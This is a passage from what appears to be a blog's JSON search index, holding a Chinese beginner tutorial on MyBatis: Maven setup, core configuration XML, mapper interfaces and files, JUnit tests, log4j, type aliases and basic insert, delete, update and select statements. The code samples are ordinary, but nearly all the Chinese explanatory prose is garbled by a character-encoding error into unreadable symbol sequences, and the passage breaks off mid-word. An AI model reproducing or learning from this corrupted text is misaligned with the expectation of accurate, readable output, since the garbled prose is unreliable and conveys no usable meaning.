src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MyBatis-Plus"],"categories":["SQL"]},{"title":"MyBatis","url":"/posts/13919.html","content":"\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠMyBatisã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸ“å­¦ä¹ èµ„æ–™ï¼š[å°šç¡…è°· MyBatis æ•™ç¨‹](https://www.bilibili.com/video/BV1VP4y1c7j7?spm_id_from=333.337.search-card.all.click)\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡5å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š05-21\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š05-26\n- [x] ğŸ€æ€»ç»“ï¼šä½¿ç”¨å¾ˆç®€å•ï¼Œä½†åŸç†è¿˜ä¸æ‡‚\n\n## ä¸€ã€Mybatisç®€ä»‹\n\n### 1.æ¦‚å¿µ\n\n- MyBatis æ˜¯ä¸€ä¸ªå¼€æºã€è½»é‡çº§çš„æ•°æ®æŒä¹…åŒ–æ¡†æ¶ï¼Œæ˜¯ JDBC å’Œ Hibernate çš„æ›¿ä»£æ–¹æ¡ˆã€‚\n\n- MyBatis å†…éƒ¨å°è£…äº† JDBCï¼Œç®€åŒ–äº†åŠ è½½é©±åŠ¨ã€åˆ›å»ºè¿æ¥ã€åˆ›å»º statement ç­‰ç¹æ‚çš„è¿‡ç¨‹ï¼Œå¼€å‘è€…åªéœ€è¦å…³æ³¨ SQL è¯­å¥æœ¬èº«ã€‚\n\n- MyBatis æ”¯æŒå®šåˆ¶åŒ– SQLã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„ï¼Œå¯ä»¥åœ¨å®ä½“ç±»å’Œ SQL è¯­å¥ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ï¼Œæ˜¯ä¸€ç§åŠè‡ªåŠ¨åŒ–çš„ ORM å®ç°ã€‚\n\n### 2.ç‰¹æ€§\n\n- 1>MyBatis æ˜¯æ”¯æŒå®šåˆ¶åŒ– SQLã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„çš„ä¼˜ç§€çš„æŒä¹…å±‚æ¡†æ¶\n- 2>MyBatis é¿å…äº†å‡ ä¹æ‰€æœ‰çš„ JDBC ä»£ç å’Œæ‰‹åŠ¨è®¾ç½®å‚æ•°ä»¥åŠè·å–ç»“æœé›†\n- 3>MyBatiså¯ä»¥ä½¿ç”¨ç®€å•çš„XMLæˆ–æ³¨è§£ç”¨äºé…ç½®å’ŒåŸå§‹æ˜ å°„ï¼Œå°†æ¥å£å’ŒJavaçš„POJOï¼ˆPlain Old Java Objectsï¼Œæ™®é€šçš„Javaå¯¹è±¡ï¼‰æ˜ å°„æˆæ•°æ®åº“ä¸­çš„è®°å½•\n\n- 4>MyBatis æ˜¯ä¸€ä¸ªåŠè‡ªåŠ¨çš„ORMï¼ˆObject Relation Mappingï¼‰æ¡†æ¶\n\n### 3.å¯¹æ¯”\n\nå’Œ Hibernate ç›¸æ¯”ï¼ŒMyBatis å°è£…æ€§ä½äº Hibernateï¼Œä½†æ€§èƒ½ä¼˜ç§€ã€å°å·§ã€ç®€å•æ˜“å­¦ã€åº”ç”¨å¹¿æ³›ã€‚\n\nå’Œ JDBC ç›¸æ¯”ï¼ŒMyBatis å‡å°‘äº† 50% ä»¥ä¸Šçš„ä»£ç é‡ï¼Œå¹¶ä¸”æ»¡è¶³é«˜å¹¶å‘å’Œé«˜å“åº”çš„è¦æ±‚ã€‚\n\n## äºŒã€æ­å»ºMyBatis\n\n### 1.åˆ›å»ºMavenå·¥ç¨‹\n\n- 1>æ‰“åŒ…æ–¹å¼ï¼šjar\n\n```xml\n<packaging>jar</packaging>\n```\n\n- 2>å¼•å…¥ä¾èµ–\n\n```xml\n<dependencies>\n  <!-- Mybatisæ ¸å¿ƒ -->\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis</artifactId>\n    <version>3.5.9</version>\n  </dependency>\n  <!-- junitæµ‹è¯• -->\n  <dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.12</version>\n    <scope>test</scope>\n  </dependency>\n  <!-- MySQLé©±åŠ¨ -->\n  <dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <version>8.0.27</version>\n  </dependency>\n</dependencies>\n```\n\n### 2.åˆ›å»ºMyBatisæ ¸å¿ƒé…ç½®æ–‡ä»¶\n\n> ä¹ æƒ¯ä¸Šå‘½åä¸º`mybatis-config.xml`ï¼Œå­˜æ”¾çš„ä½ç½®æ˜¯src/main/resourcesç›®å½•ä¸‹\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>  \n<!DOCTYPE configuration  \nPUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"  \n\"http://mybatis.org/dtd/mybatis-3-config.dtd\">  \n<configuration>  \n\t<!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„ç¯å¢ƒ-->  \n\t<environments default=\"development\">  \n\t\t<environment id=\"development\">  \n\t\t\t<transactionManager type=\"JDBC\"/>  \n\t\t\t<dataSource type=\"POOLED\">  \n\t\t\t\t<property name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/>  \n\t\t\t\t<property name=\"url\" value=\"jdbc:mysql://localhost:3306/MyBatis\"/>  \n\t\t\t\t<property name=\"username\" value=\"root\"/>  \n\t\t\t\t<property name=\"password\" value=\"root\"/>  \n\t\t\t</dataSource>  \n\t\t</environment>  \n\t</environments>  \n\t<!--å¼•å…¥æ˜ å°„æ–‡ä»¶-->  \n\t<mappers>  \n\t\t<mapper resource=\"mappers/UserMapper.xml\"/>  \n\t</mappers>  \n</configuration>\n```\n\n### 3.åˆ›å»ºmapperæ¥å£\n\n>MyBatisä¸­çš„mapperæ¥å£ç›¸å½“äºä»¥å‰çš„daoã€‚åŒºåˆ«åœ¨äºmapperä»…ä»…æ˜¯æ¥å£ï¼Œæˆ‘ä»¬ä¸éœ€è¦æä¾›å®ç°ç±»\n\n```java\npackage com.jianjian.mapper;\n\npublic interface UserMapper {\n    /**\n     * æ·»åŠ ç”¨æˆ·ä¿¡æ¯  \n     */\n    int insertUser();\n}\n```\n\n### 4.åˆ›å»ºMyBatisæ˜ å°„æ–‡ä»¶\n\n- ç›¸å…³æ¦‚å¿µï¼šORMï¼ˆObject Relationship Mappingï¼‰å¯¹è±¡å…³ç³»æ˜ å°„ã€‚ \n  - å¯¹è±¡ï¼šJavaçš„å®ä½“ç±»å¯¹è±¡  \n  - å…³ç³»ï¼šå…³ç³»å‹æ•°æ®åº“  \n  - æ˜ å°„ï¼šäºŒè€…ä¹‹é—´çš„å¯¹åº”å…³ç³»\n\n\n| Javaæ¦‚å¿µ | æ•°æ®åº“æ¦‚å¿µ |\n| -------- | ---------- |\n| ç±»       | è¡¨         |\n| å±æ€§     | å­—æ®µ/åˆ—    |\n| å¯¹è±¡     | è®°å½•/è¡Œ    |\n\n**æ˜ å°„æ–‡ä»¶çš„å‘½åè§„åˆ™ï¼šè¡¨æ‰€å¯¹åº”çš„å®ä½“ç±»çš„ç±»å+Mapper.xmlï¼Œå­˜æ”¾çš„ä½ç½®æ˜¯src/main/resources/mappersç›®å½•ä¸‹**\n\n- ä¾‹å¦‚ï¼šè¡¨t_userï¼Œæ˜ å°„çš„å®ä½“ç±»ä¸ºUserï¼Œæ‰€å¯¹åº”çš„æ˜ å°„æ–‡ä»¶ä¸ºUserMapper.xml \n- å› æ­¤ä¸€ä¸ªæ˜ å°„æ–‡ä»¶å¯¹åº”ä¸€ä¸ªå®ä½“ç±»ï¼Œå¯¹åº”ä¸€å¼ è¡¨çš„æ“ä½œ\n- MyBatisæ˜ å°„æ–‡ä»¶ç”¨äºç¼–å†™SQLï¼Œè®¿é—®ä»¥åŠæ“ä½œè¡¨ä¸­çš„æ•°æ®\n\nMyBatisä¸­é¢å‘æ¥å£æ“ä½œæ•°æ®ï¼Œè¦ä¿è¯ä¸¤ä¸ªä¸€è‡´\n\n- æ¡ä»¶1ï¼šmapperæ¥å£çš„å…¨ç±»åå’Œæ˜ å°„æ–‡ä»¶çš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¿æŒä¸€è‡´\n- æ¡ä»¶2ï¼šmapperæ¥å£ä¸­æ–¹æ³•çš„æ–¹æ³•åå’Œæ˜ å°„æ–‡ä»¶ä¸­ç¼–å†™SQLçš„æ ‡ç­¾çš„idå±æ€§ä¿æŒä¸€è‡´\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>  \n<!DOCTYPE mapper  \nPUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"  \n\"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">  \n<mapper namespace=\"com.jianjian.mapper.UserMapper\">  <!--æ¡ä»¶1-->  \n\t<insert id=\"insertUser\">  <!--æ¡ä»¶2-->  \n\t\tinsert into t_user values(null,'å¼ ä¸‰','123',23,'å¥³')  \n\t</insert>  \n</mapper>\n```\n\n### 5.é€šè¿‡junitæµ‹è¯•åŠŸèƒ½\n\n- 1>åˆ›å»ºæ•°æ®åº“Mybatisã€æ•°æ®è¡¨t_user\n\n```sql\nDROP TABLE IF EXISTS `t_user`;\nCREATE TABLE `t_user` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `username` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  `password` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  `age` int(11) DEFAULT NULL,\n  `sex` char(1) CHARACTER SET utf8 DEFAULT NULL,\n  `email` varchar(255) CHARACTER SET utf8 DEFAULT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n- 2>åˆ›å»ºUserå®ä½“ç±»\n\n```java\npackage com.jianjian.pojo;\n\npublic class User {\n    private Integer id;\n    private String username;\n    private String password;\n    private Integer age;\n    private String sex;\n    private String email;\n  \t//...æ„é€ å™¨ã€getã€setã€toStringæ–¹æ³•\n}\n```\n\n- 3>åˆ›å»ºæµ‹è¯•ç±»\n\n```java\npublic class UserMapperTest {\n    @Test\n    public void testInsertUser() throws IOException {\n        //è¯»å–MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶\n        InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n        //è·å–SqlSessionFactoryBuilderå¯¹è±¡\n        SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n        //é€šè¿‡æ ¸å¿ƒé…ç½®æ–‡ä»¶æ‰€å¯¹åº”çš„å­—èŠ‚è¾“å…¥æµåˆ›å»ºå·¥å‚ç±»SqlSessionFactoryï¼Œç”Ÿäº§SqlSessionå¯¹è±¡\n        SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n        //è·å–sqlSessionï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½å¿…é¡»æ‰‹åŠ¨æäº¤æˆ–å›æ»šäº‹åŠ¡\n        //SqlSession sqlSession = sqlSessionFactory.openSession();\n\t      //åˆ›å»ºSqlSessionå¯¹è±¡ï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½ä¼šè‡ªåŠ¨æäº¤  \n\t\t    SqlSession sqlSession = sqlSessionFactory.openSession(true);\n        //é€šè¿‡ä»£ç†æ¨¡å¼åˆ›å»ºUserMapperæ¥å£çš„ä»£ç†å®ç°ç±»å¯¹è±¡\n        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n        //è°ƒç”¨UserMapperæ¥å£ä¸­çš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ ¹æ®UserMapperçš„å…¨ç±»ååŒ¹é…å…ƒç´ æ–‡ä»¶ï¼Œé€šè¿‡è°ƒç”¨çš„æ–¹æ³•ååŒ¹é…æ˜ å°„æ–‡ä»¶ä¸­çš„SQLæ ‡ç­¾ï¼Œå¹¶æ‰§è¡Œæ ‡ç­¾ä¸­çš„SQLè¯­å¥\n        int result = userMapper.insertUser();\n        //æäº¤äº‹åŠ¡\n        //sqlSession.commit();\n        System.out.println(\"result:\" + result);\n    }\n}\n```\n\n- SqlSessionï¼šä»£è¡¨Javaç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´çš„ä¼šè¯ã€‚ï¼ˆHttpSessionæ˜¯Javaç¨‹åºå’Œæµè§ˆå™¨ä¹‹é—´çš„ä¼šè¯ï¼‰\n- SqlSessionFactoryï¼šæ˜¯â€œç”Ÿäº§â€SqlSessionçš„â€œå·¥å‚â€\n- å·¥å‚æ¨¡å¼ï¼šå¦‚æœåˆ›å»ºæŸä¸€ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨çš„è¿‡ç¨‹åŸºæœ¬å›ºå®šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠåˆ›å»ºè¿™ä¸ªå¯¹è±¡çš„ç›¸å…³ä»£ç å°è£…åˆ°ä¸€ä¸ªâ€œå·¥å‚ç±»â€ä¸­ï¼Œä»¥åéƒ½ä½¿ç”¨è¿™ä¸ªå·¥å‚ç±»æ¥â€œç”Ÿäº§â€æˆ‘ä»¬éœ€è¦çš„å¯¹è±¡\n- æ­¤æ—¶éœ€è¦æ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼Œå¦‚æœè¦è‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œåˆ™åœ¨è·å–sqlSessionå¯¹è±¡æ—¶ï¼Œä½¿ç”¨`SqlSession sqlSession = sqlSessionFactory.openSession(true);`ï¼Œä¼ å…¥ä¸€ä¸ªBooleanç±»å‹çš„å‚æ•°ï¼Œå€¼ä¸ºtrueï¼Œè¿™æ ·å°±å¯ä»¥è‡ªåŠ¨æäº¤\n\n### 6.å°è£…SqlSessionUtilså·¥å…·ç±»\n\næ–°å»ºutils/SqlSessionUtils.java\n\n```java\npublic class SqlSessionUtils {\n    public static SqlSession getSqlSession(){\n        SqlSession sqlSession = null;\n        try {\n            //è¯»å–MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶\n            InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n            //è·å–SqlSessionFactoryBuilderå¯¹è±¡\n            SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n            //é€šè¿‡æ ¸å¿ƒé…ç½®æ–‡ä»¶æ‰€å¯¹åº”çš„å­—èŠ‚è¾“å…¥æµåˆ›å»ºå·¥å‚ç±»SqlSessionFactoryï¼Œç”Ÿäº§SqlSessionå¯¹è±¡\n            SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n            //åˆ›å»ºSqlSessionå¯¹è±¡ï¼Œæ­¤æ—¶é€šè¿‡SqlSessionå¯¹è±¡æ‰€æ“ä½œçš„sqléƒ½ä¼šè‡ªåŠ¨æäº¤\n            sqlSession = sqlSessionFactory.openSession(true);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        return sqlSession;\n    }\n}\n```\n\n### 7.åŠ å…¥log4jæ—¥å¿—åŠŸèƒ½\n\n- 1>åŠ å…¥ä¾èµ–\n\n```xml\n<!-- log4jæ—¥å¿— -->\n<dependency>\n<groupId>log4j</groupId>\n<artifactId>log4j</artifactId>\n<version>1.2.17</version>\n</dependency>\n```\n\n- 2>åŠ å…¥log4jçš„é…ç½®æ–‡ä»¶\n\n  - log4jçš„é…ç½®æ–‡ä»¶åä¸ºlog4j.xmlï¼Œå­˜æ”¾çš„ä½ç½®æ˜¯src/main/resourcesç›®å½•ä¸‹\n\n  - æ—¥å¿—çš„çº§åˆ«ï¼šFATAL(è‡´å‘½)>ERROR(é”™è¯¯)>WARN(è­¦å‘Š)>INFO(ä¿¡æ¯)>DEBUG(è°ƒè¯•) \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE log4j:configuration SYSTEM \"log4j.dtd\">\n<log4j:configuration xmlns:log4j=\"http://jakarta.apache.org/log4j/\">\n    <appender name=\"STDOUT\" class=\"org.apache.log4j.ConsoleAppender\">\n        <param name=\"Encoding\" value=\"UTF-8\" />\n        <layout class=\"org.apache.log4j.PatternLayout\">\n\t\t\t<param name=\"ConversionPattern\" value=\"%-5p %d{MM-dd HH:mm:ss,SSS} %m (%F:%L) \\n\" />\n        </layout>\n    </appender>\n    <logger name=\"java.sql\">\n        <level value=\"debug\" />\n    </logger>\n    <logger name=\"org.apache.ibatis\">\n        <level value=\"info\" />\n    </logger>\n    <root>\n        <level value=\"debug\" />\n        <appender-ref ref=\"STDOUT\" />\n    </root>\n</log4j:configuration>\n```\n\n## ä¸‰ã€æ ¸å¿ƒé…ç½®æ–‡ä»¶è¯¦è§£\n\n>æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­çš„æ ‡ç­¾å¿…é¡»æŒ‰ç…§å›ºå®šçš„é¡ºåº(æœ‰çš„æ ‡ç­¾å¯ä»¥ä¸å†™ï¼Œä½†é¡ºåºä¸€å®šä¸èƒ½ä¹±)ï¼š\n>**é¡ºåºä¸ºï¼š**propertiesã€settingsã€typeAliasesã€typeHandlersã€objectFactoryã€objectWrapperFactoryã€reflectorFactoryã€pluginsã€environmentsã€databaseIdProviderã€mappers\n\n### 1.properties\n\n- 1>æ·»åŠ propertiesæ ‡ç­¾\n\n```xml\n<!--å¼•å…¥propertiesæ–‡ä»¶ï¼Œæ­¤æ—¶å°±å¯ä»¥${å±æ€§å}çš„æ–¹å¼è®¿é—®å±æ€§å€¼-->\n<properties resource=\"jdbc.properties\"></properties>\n```\n\n- 2>åˆ›å»ºresources/jdbc.properties\n\n```properties\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/Mybatis\njdbc.username=root\njdbc.password=root\n```\n\n### 2.settings\n\n```xml\n<settings>\n  <!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°-->\n  <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n  <!--å¼€å¯å»¶è¿ŸåŠ è½½-->\n  <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n</settings>\n```\n\n### 3.typeAliases\n\n- typeAliasï¼šè®¾ç½®æŸä¸ªå…·ä½“çš„ç±»å‹çš„åˆ«å\n- å±æ€§ï¼š\n  -  typeï¼šéœ€è¦è®¾ç½®åˆ«åçš„ç±»å‹çš„å…¨ç±»å\n  - aliasï¼šè®¾ç½®æ­¤ç±»å‹çš„åˆ«åï¼Œä¸”åˆ«åä¸åŒºåˆ†å¤§å°å†™ã€‚è‹¥ä¸è®¾ç½®æ­¤å±æ€§ï¼Œè¯¥ç±»å‹æ‹¥æœ‰é»˜è®¤çš„åˆ«åï¼Œå³ç±»å\n\na>è®¾ç½®å•ä¸ªå¯¹è±¡åˆ«å\n\n```xml\n<typeAliases>\n  <typeAlias type=\"com.jianjian.pojo.User\"></typeAlias>  <!--é»˜è®¤åˆ«åï¼Œç±»å-->\n  <typeAlias type=\"com.jianjian.pojo.User\" alias=\"user\"></typeAlias><!--è‡ªå®šä¹‰åˆ«å-->\n</typeAliases>\n```\n\nb>è®¾ç½®æŸåŒ…ä¸‹æ‰€æœ‰å¯¹è±¡æ‹¥æœ‰é»˜è®¤åˆ«å\n\n```xml\n<typeAliases>\n  <!--ä»¥åŒ…ä¸ºå•ä½ï¼Œè®¾ç½®æ”¹åŒ…ä¸‹æ‰€æœ‰çš„ç±»å‹éƒ½æ‹¥æœ‰é»˜è®¤çš„åˆ«åï¼Œå³ç±»åä¸”ä¸åŒºåˆ†å¤§å°å†™-->\n  <package name=\"com.jianjian.pojo\"/>\n</typeAliases>\n```\n\n**åœ¨MyBatisä¸­ï¼Œå¯¹äºJavaä¸­å¸¸ç”¨çš„ç±»å‹éƒ½è®¾ç½®äº†ç±»å‹åˆ«å**  \n\n| åˆ«å       | æ˜ å°„çš„ç±»å‹ |\n| :--------- | :--------- |\n| _byte      | byte       |\n| _long      | long       |\n| _short     | short      |\n| _int       | int        |\n| _integer   | int        |\n| _double    | double     |\n| _float     | float      |\n| _boolean   | boolean    |\n| string     | String     |\n| byte       | Byte       |\n| long       | Long       |\n| short      | Short      |\n| int        | Integer    |\n| integer    | Integer    |\n| double     | Double     |\n| float      | Float      |\n| boolean    | Boolean    |\n| date       | Date       |\n| decimal    | BigDecimal |\n| bigdecimal | BigDecimal |\n| object     | Object     |\n| map        | Map        |\n| hashmap    | HashMap    |\n| list       | List       |\n| arraylist  | ArrayList  |\n| collection | Collection |\n| iterator   | Iterator   |\n\n### 4.plugins\n\n```xml\n<plugins>\n  <plugin interceptor=\"org.mybatis.example.ExamplePlugin\">\n    <property name=\"someProperty\" value=\"100\"/>\n  </plugin>\n</plugins>\n```\n\n### 5.environments\n\n```xml\n<environments default=\"mysql_test\">\n  <!--\n    environmentï¼šè®¾ç½®å…·ä½“çš„è¿æ¥æ•°æ®åº“çš„ç¯å¢ƒä¿¡æ¯\n    å±æ€§ï¼šidï¼šè®¾ç½®ç¯å¢ƒçš„å”¯ä¸€æ ‡è¯†ï¼Œå¯é€šè¿‡environmentsæ ‡ç­¾ä¸­çš„defaultè®¾ç½®æŸä¸€ä¸ªç¯å¢ƒçš„idï¼Œè¡¨ç¤ºé»˜è®¤ä½¿ç”¨çš„ç¯å¢ƒ\n   -->\n  <environment id=\"mysql_test\">\n    <!--\n      transactionManagerï¼šè®¾ç½®äº‹åŠ¡ç®¡ç†æ–¹å¼\n         å±æ€§ï¼š\n          typeï¼šè®¾ç½®äº‹åŠ¡ç®¡ç†æ–¹å¼ï¼Œtype=\"JDBC|MANAGED\"\n          type=\"JDBC\"ï¼šè®¾ç½®å½“å‰ç¯å¢ƒçš„äº‹åŠ¡ç®¡ç†éƒ½å¿…é¡»æ‰‹åŠ¨å¤„ç†\n          type=\"MANAGED\"ï¼šè®¾ç½®äº‹åŠ¡è¢«ç®¡ç†ï¼Œä¾‹å¦‚springä¸­çš„AOP\n     -->\n    <transactionManager type=\"JDBC\"/>\n    <!--\n     dataSourceï¼šè®¾ç½®æ•°æ®æº\n      å±æ€§ï¼š\n        typeï¼šè®¾ç½®æ•°æ®æºçš„ç±»å‹ï¼Œtype=\"POOLED|UNPOOLED|JNDI\"\n        type=\"POOLED\"ï¼šä½¿ç”¨æ•°æ®åº“è¿æ¥æ± ï¼Œå³ä¼šå°†åˆ›å»ºçš„è¿æ¥è¿›è¡Œç¼“å­˜ï¼Œä¸‹æ¬¡ä½¿ç”¨å¯ä»¥ä»ç¼“å­˜ä¸­ç›´æ¥è·å–ï¼Œä¸éœ€è¦é‡æ–°åˆ›å»º\n         type=\"UNPOOLED\"ï¼šä¸ä½¿ç”¨æ•°æ®åº“è¿æ¥æ± ï¼Œå³æ¯æ¬¡ä½¿ç”¨è¿æ¥éƒ½éœ€è¦é‡æ–°åˆ›å»º\n         type=\"JNDI\"ï¼šè°ƒç”¨ä¸Šä¸‹æ–‡ä¸­çš„æ•°æ®æº\n       -->\n    <dataSource type=\"POOLED\">\n      <!--è®¾ç½®é©±åŠ¨ç±»çš„å…¨ç±»å-->\n      <property name=\"driver\" value=\"${jdbc.driver}\"/>\n      <!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„è¿æ¥åœ°å€-->\n      <property name=\"url\" value=\"${jdbc.url}\"/>\n      <!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å-->\n      <property name=\"username\" value=\"${jdbc.username}\"/>\n      <!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„å¯†ç -->\n      <property name=\"password\" value=\"${jdbc.password}\"/>\n    </dataSource>\n  </environment>\n</environments>\n```\n\n### 6.mappers\n\na>å¼•å…¥å•ä¸ªæ˜ å°„æ–‡ä»¶\n\n```xml\n<!--å¼•å…¥æ˜ å°„æ–‡ä»¶-->\n<mappers>\n  <mapper resource=\"UserMapper.xml\"/>\n</mappers>\n```\n\na>å¼•å…¥åŒ…ä¸‹æ‰€æœ‰æ˜ å°„æ–‡ä»¶\n\n- æ¡ä»¶1ï¼šæ­¤æ–¹å¼å¿…é¡»ä¿è¯mapperæ¥å£å’Œmapperæ˜ å°„æ–‡ä»¶å¿…é¡»åœ¨ç›¸åŒçš„åŒ…åä¸‹\n- æ¡ä»¶2ï¼šmapperæ¥å£è¦å’Œmapperæ˜ å°„æ–‡ä»¶çš„åå­—ä¸€è‡´\n\n```xml\n<!--å¼•å…¥æ˜ å°„æ–‡ä»¶-->\n<mappers>\n  <package name=\"com.jianjian.mapper\"/>\n</mappers>\n```\n\n![](https://img.jwt1399.top/img/202211151859675.png)\n\n### 7.è®¾ç½®é…ç½®æ–‡ä»¶æ¨¡ç‰ˆ\n\nIDEAåå¥½è®¾ç½®â†’ç¼–è¾‘å™¨â†’æ–‡ä»¶å’Œä»£ç æ¨¡ç‰ˆâ†’ç‚¹å‡»â€œ+â€å·æ–°å»ºæ¨¡ç‰ˆâ†’åå­—è®¾ç½®ä¸ºmybatis-configâ†’æ‰©å±•è®¾ç½®ä¸ºxmlâ†’å¤åˆ¶ä¸‹é¢ä»£ç å¹¶ä¿å­˜\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <!--å¼•å…¥properties-->\n    <properties resource=\"jdbc.properties\"></properties>\n    <!--è®¾ç½®åˆ«å-->\n    <typeAliases>\n        <package name=\"com.jianjian.pojo\"/>\n    </typeAliases>\n    <!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„ç¯å¢ƒ-->\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"${jdbc.driver}\"/>\n                <property name=\"url\" value=\"${jdbc.url}\"/>\n                <property name=\"username\" value=\"${jdbc.username}\"/>\n                <property name=\"password\" value=\"${jdbc.password}\"/>\n            </dataSource>\n        </environment>\n    </environments>\n    <!--å¼•å…¥æ˜ å°„æ–‡ä»¶-->\n    <mappers>\n        <package name=\"com.jianjian.mapper\"/>\n    </mappers>\n</configuration>\n```\n\n## å››ã€MyBatisçš„å¢åˆ æ”¹æŸ¥\n\n### 1.æ·»åŠ \n\n```java\npackage com.jianjian.mapper;\npublic interface UserMapper {\n    int insertUser();\n}\n```\n\n```xml\n<!--int insertUser();-->\n<insert id=\"insertUser\">\n\tinsert into t_user values(null,'admin','123456',23,'ç”·','12345@qq.com')\n</insert>\n```\n\n```java\n@Test\npublic void testInsertUser(){\n    SqlSession sqlsession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlsession.getMapper(UserMapper.class);\n    int result = userMapper.insertUser();\n    System.out.println(\"result:\" + result);\n}\n```\n\n### 2.åˆ é™¤\n\n```java\npackage com.jianjian.mapper;\npublic interface UserMapper {\n    int insertUser();\n    int deleteUser();\n}\n```\n\n```xml\n<!--int deleteUser();-->\n <delete id=\"deleteUser\">\n     delete from t_user where id = 6\n </delete>\n```\n\n```java\n@Test\npublic void testDeleteUser(){\n    SqlSession sqlsession = SqlSessionUtils.getSqlSession();\n    UserMapper userMapper = sqlsession.getMapper(UserMapper.class);\n    int result = userMapper.deleteUser();\n    System.out.println(\"result:\" + result);\n}\n```\n\n### 3.ä¿®æ”¹\n\n```xml\n<!--int updateUser();-->\n <update id=\"updateUser\">\n     update t_user set username = 'å¼ ä¸‰' where id = 5\n </update>\n```\n\n### 4.æŸ¥è¯¢ä¸€ä¸ªå®ä½“ç±»å¯¹è±¡\n\n```xml\n<!--User getUserById();-->  \n<select id=\"getUserById\" resultType=\"com.jianjian.pojo.User\">  \n\tselect * from t_user where id = 2  \n</select>\n```\n\n### 5.æŸ¥è¯¢é›†åˆ\n\n```xml\n<!--List<User> getUserList();-->\n<select id=\"getUserList\" resultType=\"User\">\n\tselect * from t_user\n</select>\n```\n\næ³¨æ„ï¼š\n\n- æŸ¥è¯¢çš„æ ‡ç­¾selectå¿…é¡»è®¾ç½®å±æ€§resultTypeæˆ–resultMapï¼Œç”¨äºè®¾ç½®å®ä½“ç±»å’Œæ•°æ®åº“è¡¨çš„æ˜ å°„å…³ç³»  \n\n  - resultTypeï¼šè‡ªåŠ¨æ˜ å°„ï¼Œç”¨äºå±æ€§åå’Œè¡¨ä¸­å­—æ®µåä¸€è‡´çš„æƒ…å†µï¼Œå€¼ä¸ºå…¨ç±»åæˆ–åˆ«å\n\n  - resultMapï¼šè‡ªå®šä¹‰æ˜ 